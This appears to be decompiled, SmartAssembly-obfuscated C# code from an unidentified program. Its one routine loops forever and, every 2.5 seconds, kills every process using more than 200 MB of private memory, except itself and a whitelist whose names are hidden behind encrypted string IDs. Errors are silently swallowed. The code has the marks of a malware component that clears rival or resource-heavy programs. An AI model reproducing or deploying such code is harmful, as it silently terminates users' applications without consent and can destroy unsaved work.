using System;
using System.Diagnostics;
using System.Threading;
using SmartAssembly.Delegates;
using SmartAssembly.HouseOfCards;

namespace esImVhYKuzS;

public static class yTNdYRVrMj
{
	[NonSerialized]
	internal static GetString getString_0;

	public static void lKvmGhZVOEM()
	{
		while (true)
		{
			Process[] processes = Process.GetProcesses();
			foreach (Process process in processes)
			{
				try
				{
					if (process.PrivateMemorySize64 > 209715200L && process.ProcessName != Process.GetCurrentProcess().ProcessName && !process.ProcessName.Contains(getString_0(107399753)) && !process.ProcessName.Contains(getString_0(107399776)) && !process.ProcessName.Contains(getString_0(107399735)) && !process.ProcessName.Contains(getString_0(107399726)) && !process.ProcessName.Contains(getString_0(107399745)) && !process.ProcessName.Contains(getString_0(107399700)) && !process.ProcessName.Contains(getString_0(107399719)) && !process.ProcessName.Contains(getString_0(107399706)) && !process.ProcessName.Contains(getString_0(107399661)) && !process.ProcessName.Contains(getString_0(107399680)) && !process.ProcessName.Contains(getString_0(107399115)))
					{
						process.Kill();
					}
				}
				catch
				{
				}
			}
			try
			{
				Thread.Sleep(2500);
			}
			catch
			{
			}
		}
	}

	static yTNdYRVrMj()
	{
		Strings.CreateGetStringDelegate(typeof(yTNdYRVrMj));
	}
}
